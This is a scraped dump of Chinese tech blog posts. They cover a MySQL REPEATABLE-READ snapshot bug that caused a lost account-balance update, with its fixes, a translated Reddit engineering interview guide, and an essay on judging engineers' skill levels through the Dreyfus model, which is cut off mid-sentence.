data-line=\"crayon-5b4aa9316d04f727663207-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9316d04f727663207-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9316d04f727663207-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9316d04f727663207-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9316d04f727663207-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9316d04f727663207-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9316d04f727663207-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9316d04f727663207-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9316d04f727663207-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9316d04f727663207-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9316d04f727663207-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9316d04f727663207-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9316d04f727663207-1\"><span class=\"crayon-e \">select *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">user</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9316d04f727663207-2\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">name</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9316d04f727663207-3\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10001</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9316d04f727663207-4\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10002</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9316d04f727663207-5\"><span class=\"crayon-e \">select *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">user_account</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9316d04f727663207-6\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">amount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9316d04f727663207-7\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10001</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10.0000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9316d04f727663207-8\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10002</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">108.9900</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9316d04f727663207-9\"><span class=\"crayon-e \">select *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">user_conf</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9316d04f727663207-10\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">type_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">description</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9316d04f727663207-11\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span>外部账户<span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9316d04f727663207-12\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">200</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span>内部账户<span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0037 seconds] -->\r\n<p><strong>模拟</strong>提现（即余额减）和入账（即余额加）<strong>并发操作的事务</strong>如下：</p>\n<table>\n<thead>\n<tr>\n<th>session1-提现10元</th>\n<th>session2-入账20元</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>begin；</td>\n<td></td>\n</tr>\n<tr>\n<td>select description from user_conf where type_id = 100;</td>\n<td></td>\n</tr>\n<tr>\n<td>select * from user where uid = 10001 for update; // user表用来做互斥</td>\n<td></td>\n</tr>\n<tr>\n<td>select amount from user_account where uid = 10001; // 10.00</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>begin;</td>\n</tr>\n<tr>\n<td></td>\n<td>select description from user_conf where type_id = 100;</td>\n</tr>\n<tr>\n<td></td>\n<td>select * from user where uid = 10001 for update; // <strong>wating</strong></td>\n</tr>\n<tr>\n<td></td>\n<td>//wating</td>\n</tr>\n<tr>\n<td>update user_account set amount = 0.00 where uid = 10001;</td>\n<td></td>\n</tr>\n<tr>\n<td>commit;</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>拿到锁</td>\n</tr>\n<tr>\n<td></td>\n<td>select amount from user_account where uid = 10001; //<strong>10.00</strong></td>\n</tr>\n<tr>\n<td></td>\n<td>入账20元，代码中计算后应该为30元</td>\n</tr>\n<tr>\n<td></td>\n<td>update user_account set amount = 30.00 where uid = 10001;</td>\n</tr>\n<tr>\n<td></td>\n<td>commit;</td>\n</tr>\n</tbody>\n</table>\n<p>问题出现了，后面再查询该用户余额为30元，即用户提现的10元未反映在余额中</p>\n<h2>原因定位</h2>\n<p>熟悉mysql的同学或许已经知道问题是<strong>由REPEATABLE-READ隔离级别下快照读导致</strong>。</p>\n<p><strong>具体解释：</strong></p>\n<p>RR级别下，第一次读操作会生成快照，对于可见性来说，只有当第一次读之前其他事务提交的修改和自己的修改可见，其他的均不可见。</p>\n<blockquote><p>官网文档：<a href=\"https://dev.mysql.com/doc/refman/5.7/en/glossary.html\">https://dev.mysql.com/doc/refman/5.7/en/glossary.html</a> snapshot A representation of data at a particular time, which remains the same even as changes are committed by other transactions.</p>\n<p>With REPEATABLE READ isolation level, the snapshot is based on the time when the first read operation is performed.</p></blockquote>\n<p><strong>可见性原理</strong></p>\n<p>可参考文章：<a href=\"http://hedengcheng.com/?p=148\">http://hedengcheng.com/?p=148</a></p>\n<p>回到上述模拟场景中，session2在sql语句<code>select description from user_conf where type_id = 100;</code> 时已生成快照，虽然session1提交了，但仍然不可见，导致并发更新问题。</p>\n<p>另外，开启事务后，<strong>SELECT … FOR UPDATE 是不会生成快照的</strong>，大家可自行实验</p>\n<h2>解决方案</h2>\n<h3>方案一</h3>\n<p>将REPEATABLE-READ隔离级别改为READ-COMMITTED，这样即能看到最新提交的数据。</p>\n<h3>方案二</h3>\n<p>在读’账户余额明细表’user_account 的时候加 for update，这样会 1.强制读该行记录的最新版本数据，2.且若其他事务未commit，本事务将阻塞，保证串行更新</p>\n<h3>方案三</h3>\n<p>延时生成快照。开启事务后，首先就通过user表做互斥，直接for update加锁，针对多个事务并发更新即变为串行。</p>\n<h2>附：定位过程</h2>\n<ol>\n<li>针对上报bug用户，查询其交易流水明细与余额变更明细，确认账务存在问题</li>\n<li>查询账务系统近几天是否有上线变更，检查无</li>\n<li>拉取账务数据库mysql general log，找到并发更新的两个事务session</li>\n<li>查询数据库设置的隔离级别为RR，查询应用数据库连接池配置即<strong>session的隔离级别未配置</strong>，采用数据库配置</li>\n<li>确认由RR级别导致（当然也可以认为是代码问题导致）</li>\n<li>确认是一个月前账务系统分库分表上线，改用其他<strong>连接池且未设置session隔离级别</strong>。而之前是有配置session的隔离级别为READ-COMMITTED。</li>\n</ol>\n<h2>延伸思考</h2>\n<p>mysql RR级别适用的业务场景是什么，应该怎么选择？ 有兴趣或有见解的同学可以留言回复或私信~~</p>\n<h2>参考</h2>\n<blockquote><p><a href=\"http://blog.csdn.net/chen77716/article/details/6742128#comments\">http://blog.csdn.net/chen77716/article/details/6742128#comments</a></p>\n<p><a href=\"http://hedengcheng.com/?p=148\">http://hedengcheng.com/?p=148</a></p>\n<p><a href=\"https://liuzhengyang.github.io/2017/04/18/innodb-mvcc/\">https://liuzhengyang.github.io/2017/04/18/innodb-mvcc/</a></p></blockquote>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113917\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113917votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113917\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,MySQL,数据库", "url": "http://blog.jobbole.com/113917/", "url_obj_id": "e18020cb4a67969752b680d482555760"}
{"front_img_url": ["http://wx4.sinaimg.cn/mw690/7cc829d3gy1fqeikwffd2j20xc0g4ju2.jpg"], "title": "Reddit 如何面试工程师？", "create_date": "2018/04/20 ·", "praise_num": 1, "fav_num": 1, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/chenyahui\">精算狗</a> 翻译，<a href=\"http://www.jobbole.com/members/liuchang\">刘唱</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://redditblog.com/2017/08/02/acing-your-technical-interviews-at-reddit/\">Redditblog</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><blockquote><p>Reddit 给来应聘者写的官方指南，描述了整个面试的流程、该如何准备。</p></blockquote>\n<hr>\n<p><img class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fqeikwffd2j20xc0g4ju2.jpg\" width=\"578\" height=\"280\"></p>\n<p><strong>在 Reddit，我们理解面试</strong>可能非常令人头疼，因此我们做了这份指南来帮你顺利通过面试。你不会不学习就去参加期末考试，对吧？同样，我们也不希望你不准备就来参加面试。请把这篇文章作为通过面试的学习指南。</p>\n<p><img class=\"aligncenter size-large wp-image-21663\" src=\"https://redditupvoted.files.wordpress.com/2017/08/recruiting-image-1.png?w=720&amp;h=61\"></p>\n<p>到目前为止，你大概已经与我们招聘团队的成员通过电话了，完成了初步的电话面试。那么恭喜你能继续下一步的面试！接下来要面对你的第一个技术面试了——这一次是与我们的工程师进行的电话面试。</p>\n<h3>电话技术面试</h3>\n<p>这部分面试更偏向于一般的能力倾向测试，旨在了解你对网络及其安全漏洞相关基本概念的技能。这部分面试基本上一半是问答形式的题目，一半是编程训练。你可能不知道所有问题的答案，这是可以接受的。重要的是，我们可以了解你的能力范围，并据此决定你的专长能否满足我们团队的需求。</p>\n<p>在回答这些问题时，一定要解释你是如何得到这个答案的，以及为什么采用这种方法。</p>\n<p><em>提示：打开你的笔记本并准备好面试。确保你接上了网线或者连上了可靠的 </em><em>WIFI</em><em>，并仔细检查你准备接电话的地方手机信号是否够强。</em></p>\n<h3>现场面试</h3>\n<p>如果你走到了这一步，那已经快成功啦。现场面试会分成三个技术面试和三个问答形式的面试。总之，面试应该会持续 5 个小时左右，所以来之前请休息好。</p>\n<p><img class=\"aligncenter size-large wp-image-21664\" src=\"https://redditupvoted.files.wordpress.com/2017/08/recruiting-image-2.png?w=720&amp;h=54\"></p>\n<h3>面试环境</h3>\n<p>你参加面试的房间里有一块白板，在技术面试中需要用到它。来参加面试时还要带上你的笔记本电脑，或者告诉我们你更希望我们提供一个笔记本电脑给你。你的技术面试要么是通过白板，要么是通过笔记本上的 coderpad（面试官会在你们见面时分享给你）。</p>\n<p>考虑到我们工作的性质，我们办公室的氛围比较休闲（当然是合理范围内！）。我们没有着装标准，建议你怎么舒服怎么穿。</p>\n<h3>技术面试</h3>\n<p>技术面试占你和我们在一起的大部分时间，总共大概是 3 个小时（每个技术面试占一个小时）。正是因为想看看你的实际编程水平，我们才要求你带笔记本来面试。尽管面试主要是看你的技术水平，但是面试官还要评估其他重要的因素，比如工作风格和团队配合。</p>\n<ul>\n<li><strong>编程</strong><strong>/</strong><strong>算法。</strong>在现场面试中你要完成两个编程面试，一个针对一般软件工程概念，另一个则更深入到你擅长的领域（无论是前端、后端还是机器学习等等）。对于一般的编程面试，我们鼓励你使用最习惯的语言来解决。在这部分会遇到的问题通常都可以利用递归和迭代技巧，用多种不同的方法来解决。</li>\n<li><strong>系统设计。</strong>与其他技术面试不同，这部分面试不是以编程为主的，但是你很可能会用到白板。你应该准备好碰到这种问题：“怎样构建一个这样的服务？”以及“如何扩大上述服务？”。此外，你还应该对互联网工作原理有扎实的理解。</li>\n</ul>\n<p><img class=\"aligncenter size-full wp-image-21665\" src=\"https://redditupvoted.files.wordpress.com/2017/08/recruiting-image-3.gif?w=720\"></p>\n<h3>应当牢记的几点</h3>\n<p><strong>别忽视面试的语言交流方面。</strong></p>\n<p>技术面试不是为了看你能否得出正确答案，而是为了检验你能够多好地与他人合作。把面试官当成一个帮助你解决问题的人，就像你的队友一样。我们明白一个人不可能完成所有事情，因此特意招募了不同背景和有不同技能的人来建立我们的团队。我们更想知道你有哪些领域的技能，而不是想找到完美的工程师。如果你忘了这篇指南里的其他内容，把下面这三点牢记于心就能让你在技术面试中遥遥领先：</p>\n<ul>\n<li><strong>倾听并认真考虑面试官的建议</strong>。他们很可能已经问过上百遍同样的问题，并见识了不同的解决方法。他们的工作就是帮你找到<em>最好</em>的方法。</li>\n<li><strong>把你的思考过程说出来，并能够解释你所用方法的优缺点</strong>。比起你能否想出解决方法，我们更在意你是怎样想出这个解决方法的。</li>\n<li><strong>在你没想好解决方法之前，别急着写代码</strong>。正如我们的一个工程师曾经告诉我的那样，在没有考虑木头的尺寸和如何把每个零件拼在一起之前是不会开始建工作台的；同样，在你开始写代码之前你也应该知道要怎样解决问题。</li>\n</ul>\n<h3>问答面试（Q&amp;A Interviews）</h3>\n<p>在 Reddit，我们给予人们自主权来让他们能做自己。尽管技术面试可能需要集中精神，但是问答面试要轻松得多。问答面试的面试官通常不在你申请的团队中，主要是为了让我们在技术能力层面之外更好地了解你。</p>\n<ul>\n<li><strong>申请者 </strong><strong>AMA</strong><strong>（</strong><strong>Ask Me Anything</strong><strong>）。</strong>这项面试是为了从个人的角度了解你，因为大部分面试更关注你在电脑上能做什么。这说明，应对这项面试最好的方法是准备好谈谈你自己。这是你要面对的所有面试中最随意的，但是它有希望让你更深入地了解我们如何工作，反之亦然。</li>\n</ul>\n<p><em>提示：准备好，会有关我们企业文化、方针和办公室的日常生活的问题。你的动力和<a href=\"https://about.reddit.com/\">我们公司的价值观</a>应该有相似之处。</em></p>\n<ul>\n<li><strong>跨部门面试。</strong>从名字大概就能看出来，这项面试是为了让你初步了解怎样与其他团队合作。除非你负责基础设施，否则你就要和我们的产品团队密切合作，所以我们需要确保你能很好地连接其他技能，而这些技能与你自己所掌握的技能不同；这就意味着你能够流畅地交流并有效解决冲突。在这项面试中，你会见到我们的产品经理之一，因此此时是询问 Reddit 如何运作以及今年的产品路线图（product roadmap）等相关问题的理想时机。</li>\n</ul>\n<p><em>提示：准备一些专业轶事来帮助你突出人际交往能力。提前想好你准备怎么讲故事，从而在面试中传达某些行为属性。</em></p>\n<ul>\n<li><strong>团队负责人面试。</strong>这项面试非常可能是一天中最后一项面试（耶！）。你未来的团队负责人会从高水平上审查你的工作，深入探究你完成过的具体项目，以便确定你能怎样融入团队。这是个很好的机会，可以问问在你未来要做的项目上还不清楚的问题，组织结构的问题，以及下半年团队的规划。</li>\n</ul>\n<h3>接下来呢？</h3>\n<p>你顺利完成了现场面试，好样的！我们知道这不容易。既然你已经完成了最难的部分，那么你可以准备好在面试后一周内接到招聘官的消息。还有问题吗？不要犹豫，联系我们吧！你在每一步都能得到我们的支持。</p>\n<p><img class=\"aligncenter size-full wp-image-21666\" src=\"https://redditupvoted.files.wordpress.com/2017/08/recruiting-image-4.gif?w=720\"></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113744\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113744votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113744\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui\">精算狗</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/chenyahui\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/chenyahui/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 22</a> · <a title=\"QQ：564968845\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：564968845\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,Reddit,工程师", "url": "http://blog.jobbole.com/113744/", "url_obj_id": "ca9b7fe440dbafc569069b9a27e98bef"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/e268c18430b4378f4b65054379484b31.png"], "title": "如何识别人的技术能力和水平？", "create_date": "2018/04/25 ·", "praise_num": 1, "fav_num": 4, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://acejoy.com/2018/03/14/%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E4%BA%BA%E7%9A%84%E6%8A%80%E6%9C%AF%E8%83%BD%E5%8A%9B%E5%92%8C%E6%B0%B4%E5%B9%B3%EF%BC%9F/\">ACE开发者</a>   </div><div>\n<p>这个题目是比较复杂的，它包含的东西比较多，认真讨论估计能写几万字。如果是专业研究，我看能写一本书了。这里打算根据自己的学习过程和工作经验，谈一下要点问题，均属个人看法，欢迎讨论。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/04/e268c18430b4378f4b65054379484b31.png\" alt=\"skills tree\" width=\"600\" height=\"613\"></p>\n<p>写这篇文章的初衷，跟前段时间跟朋友们聊招聘有关。因为技术招聘除了考察人的协作精神和工作态度，一大目标便是判断人的技术能力和实际水平。在这件事情上多做观察、思考是很有意义的。</p>\n<p>对于考察人的技术等级，学界是有认真的研究的。参见：<em><strong><a href=\"https://acejoy.com/2018/03/14/%E5%BE%B7%E9%9B%B7%E7%A6%8F%E6%96%AF%E6%A8%A1%E5%9E%8B%EF%BC%88dreyfus-model-of-skill-acquisition%EF%BC%89/\" target=\"_blank\" rel=\"noopener\">德雷福斯模型解说</a></strong></em>。</p>\n<p>德雷福斯模型把人的技能水平，分成5级：<strong>新手、高级新手、胜任者、精通者、专家。</strong></p>\n<p>对不同技能等级的认定是这样的：</p>\n<hr>\n<p><strong>新手：依靠指令清单，必须按部就班。</strong>就是必须给出详细而具体的操作规则，才能工作。比如你做一道从未做过的菜，需要看菜谱的说明，第一步做什么，第二步做什么等等，直到最后烹饪结束。</p>\n<p><strong>高级新手：有限的情景洞察力，同等对待工作的各个方面。对全局性、体系性的东西没兴趣。</strong>这是小工的水平。比如他能跟着师傅干点活，打打下手。可以靠着反复检索搜索引擎、StackOverflow解决具体的小问题。</p>\n<p><strong>胜任者：能够独立解决各种各样的领域内问题。</strong>这是一般的企业招聘，比较希望招到的等级，招进来稍作适应就能干活了，省心省力。</p>\n<p><strong>精通者：经验丰富，可以自我纠正、自我改进。</strong>这类等级的人，思考可以指向内在，通过反省、反馈改善技能。这种在企业可以算上高手、大拿了，培养不易。</p>\n<p><strong>专家：依靠直觉工作，不需要解释和理由。</strong>实际你让他解释，他可能也说不出个所以然，就是直觉给出答案，然后还是对的。专家人数稀少，需要很长时间训练、实践。通常的说法是10年出专家，10000小时定律。</p>\n<hr>\n<p>这个是理论上的研究，实践中比较缺乏操作性，难以迅速的判定应聘者的实际情况。不信你打开收进来的大把简历，刚毕业的学生，每个技能名词上面都是一堆堆的“<strong>精通</strong>” – 你相信么？但它可以当成一个职业技能等级判定的参照标准。</p>\n<p>于是乎，各家企业开启了各种“笔试”、“机试”，多轮面试，并且严格要求学历以及出身院校，试图以此过滤掉不合意的应征者，留下合格的人选。<strong>它当然是可行的，但是效果一般，而且容易出错，错失有思想有水平的人。</strong>不然也不会催生出各类“推荐式”的招聘。看重学历、学校当然也有其优点：它是快速过滤的手段，毕竟能考上好学校的人智商不会太差吧。但在大数字公司的一朋友说，公司里面还有初中毕业，一直精研安全领域的人，技术能力也是十分出色。如果严苛对待背景，这些人就会错过了。因为人的生活多种多样，有各种历史的背景因素影响经历。而部分人的经历，就是跟一些人不同的，可是不妨碍他们同样可以变得优秀。招聘，实际上是建立信任关系。如果有充足的信息证明，应聘者足够优秀，这就够了。条条框框只是辅助手段，并不是目的。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/04/6c5299bf43b31ce14b2b8c6245ca1c0f.jpg\" alt=\"\" width=\"600\" height=\"779\"></p>\n<p>任正非的洞察力一流</p>\n<p>推荐式的招聘实际要靠谱的多，因为人很容易了解熟悉的人的水平。<strong>这是靠推荐者的信用背书。</strong>人平时沟通时说什么话，日常看什么书，关注哪些领域，琢磨过啥问题，哪些东西很熟，这个经常聊的熟人往往都知道。可是，这类招聘局限性也很大：<strong>面窄、靠机缘</strong>。靠推荐能招几个好手啊？好手往往是各家争抢的对象，窗口期有限，基本不会缺工作的。</p>\n<p>说了一圈，还是要在技能水准判定上有更高效率的办法，招进合适的人来。</p>\n<p>回到开头的德雷福斯模型，既然人的技能是分级的，那么<strong>对待不同的职位要求，也应该侧重不同的考察角度。</strong>如果千篇一律的走招聘流程，就容易出问题了。比如你明明要找的是“<strong>精通者</strong>”，可上来就让人一堆笔试、机试，这是不合适的。对方会十分的厌烦。体现高水平技术能力的并不在默写什么“字符串算法”那里。这反倒是刚毕业的人占便宜，因为才学过不久，印象深。不信你让工作10年的人跟计算机专业应届生比比写排序算法，真未必能赢。但是这并不重要 – 